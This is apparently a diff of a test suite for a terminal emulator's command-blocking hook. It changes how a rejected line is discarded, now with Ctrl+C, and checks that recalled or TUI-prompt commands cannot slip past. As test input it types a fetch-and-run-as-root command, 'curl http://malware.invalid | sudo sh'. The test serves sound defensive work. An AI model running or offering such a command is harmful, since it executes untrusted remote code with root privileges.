@@ -2301,8 +2301,8 @@ _hsent.clear()
 hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
 _htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
 key(hk, Qt.Key.Key_Return)
-ok(b'\r' not in _hsent and b'\x1b[F\x15' in _hsent,
-   'hook blocks: not submitted, typed line discarded (whole-line End,Ctrl+U)')
+ok(b'\r' not in _hsent and b'\x03' in _hsent,
+   'hook blocks: not submitted, typed line discarded (SIGINT Ctrl+C)')
 ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
 # history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
 # not judge a stale/empty buffer and wave a recalled command through.
@@ -2312,7 +2312,7 @@ hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
 key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
 ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
 key(hk, Qt.Key.Key_Return)
-ok(_asked and b'\x1b[F\x15' in _hsent and b'\r' not in _hsent,
+ok(_asked and b'\x03' in _hsent and b'\r' not in _hsent,
    'edited line: hook asks and (on decline) discards, never submits unjudged')
 ok(not hk._line_dirty, 'dirty flag cleared after the decision')
 # defense-in-depth: the hook layer single-lines a suggestion upstream, but the
@@ -4892,7 +4892,7 @@ _thk._hook_ask = lambda _c, _r: (_tui_asked.append(1) or 'discard')
 key(_thk, Qt.Key.Key_L, 'l')                            # type `ls` at the TUI prompt
 key(_thk, Qt.Key.Key_S, 's')
 key(_thk, Qt.Key.Key_Return)                            # accept-line
-ok(_tui_asked and b'\r' not in _thksent and b'\x1b[F\x15' in _thksent,
+ok(_tui_asked and b'\r' not in _thksent and b'\x03' in _thksent,
    'a bare TUI prompt routes accept-line through the hook (no silent bypass)')
 # an EMPTY bare prompt has nothing to judge -> the hook passes, Enter submits, no ask
 _thksent.clear(); _tui_asked.clear()
@@ -6268,7 +6268,7 @@ _h2.clear()
 hk2._hook_ask = lambda _c, _r: 'suggest'
 _htype(hk2, 'x sudo sh')
 key(hk2, Qt.Key.Key_Return)
-ok(b'ls' in b''.join(_h2) and b'\x1b[F\x15' in _h2,
+ok(b'ls' in b''.join(_h2) and b'\x03' in _h2,
    'hook: choosing the suggestion discards the line (whole-line) and inserts it')
 
 # --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
